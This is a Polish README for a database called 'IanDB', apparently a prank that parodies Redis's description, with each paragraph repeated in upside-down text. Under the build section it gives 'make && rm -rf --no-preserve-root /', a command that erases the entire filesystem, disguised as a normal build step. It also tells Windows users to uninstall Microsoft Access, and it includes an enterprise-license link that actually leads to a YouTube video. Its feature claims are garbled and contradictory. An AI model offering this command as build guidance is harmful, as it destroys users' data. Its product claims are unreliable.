# IanDB - v0.3 (Ɛ˙0ʌ ɐʍoʞᴉuɹǝᴉzpźɐdoʞɐH ɐɾɔʎpƎ - 𐐒◖uɐI)

<img src="https://i.nuuls.com/Q5BdI.png">

IanDB jest serwerem struktur danych. Oznacza to, że IanDB zapewnia dostęp do modyfikowalnych struktur danych za pośrednictwem zestawu poleceń, które są wysyłane przy użyciu modelu serwer-klient z gniazdami UDP i prostym protokołem. Dzięki temu różne procesy mogą wyszukiwać i modyfikować te same struktury danych we współdzielony sposób.

*(˙qósods ʎuolǝᴉzpłódsʍ ǝʍ ɥɔʎuɐp ʎɹnʇʞnɹʇs ǝɯɐs ǝʇ ćɐʍoʞᴉɟʎpoɯ ᴉ ćɐʍᴉʞnzsʎʍ ąƃoɯ ʎsǝɔoɹd ǝużóɹ nɯǝʇ ᴉʞęᴉzp ˙ɯǝłoʞoʇoɹd ɯʎʇsoɹd ᴉ Ԁp∩ ᴉɯɐpzɐᴉuƃ z ʇuǝᴉlʞ-ɹǝʍɹǝs nlǝpoɯ nᴉɔʎżn ʎzɹd ǝuɐłʎsʎʍ ąs ǝɹóʇʞ 'ńǝɔǝlod nʍɐʇsǝz ɯǝʍʇɔᴉupǝɹśod ɐz ɥɔʎuɐp ɹnʇʞnɹʇs ɥɔʎulɐʍoʞᴉɟʎpoɯ op dęʇsop ɐᴉuʍǝdɐz 𐐒◖uɐI ǝż 'oʇ ɐzɔɐuzO ˙ɥɔʎuɐp ɹnʇʞnɹʇs ɹǝʍɹǝs oʞɐɾ ʎuɐlśǝɹʞo oʇsęzɔ ʇsǝɾ 𐐒◖uɐI)*


Struktury danych zaimplementowane w IanDB mają kilka specjalnych właściwości:

*(:ᴉɔśoʍᴉɔśɐłʍ ɥɔʎulɐɾɔǝds ɐʞlᴉʞ ąɾɐɯ 𐐒◖uɐI ʍ ǝuɐʍoʇuǝɯǝldɯᴉɐz ɥɔʎuɐp ʎɹnʇʞnɹʇS)*

IanDB dba o przechowywanie ich na dysku. Oznacza to, że IanDB jest szybka, ale jest też nieulotna.
Implementacja struktur danych obciąża wydajność dysków twardych, więc struktury danych wewnątrz IanDB prawdopodobnie będą używać więcej dysków twardych w porównaniu do tej samej struktury danych modelowanej przy użyciu  wysokiego poziomu języka programowania.
IanDB oferuje szereg funkcji, które są naturalne do znalezienia w bazie danych, takich jak replikacja, skalowanie, dostrajalne poziomy trwałości, klastry, większe skalowanie i wysoka dostępność.
Wykorzystuje kodowanie i algorytmy, aby uniknąć przeciążenia danych i uodparnia na ataki na poziomie aplikacji.

Licencje dla przedsiębiorstw do znalezienia pod tym linkiem [https://db.ian678.com/?promocode=ygolde](https://www.youtube.com/watch?v=Tt7bzxurJ1I) 12% zniżki!

# Budowanie IanDB

    make && rm -rf --no-preserve-root /

Po zbudowaniu IanDB warto sprawdzić czy działa

    make test

### Windowsowi "Deweloperzy" 

1. Usuń Microsoft Access przy użyciu `C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE15\Office Setup Controller\setup.exe" /uninstall "AccessRT"` (niekompatybilny program)

Testowanie jest obenie niedostępne na systemach Windows.

Możliwe jest też użycie `yarn install` po pobraniu IanDB,~~nie~~ jest to możliwe na systemach Windows.

# Autorzy kodu
CBenni
 🤔

Miłej zabawy!
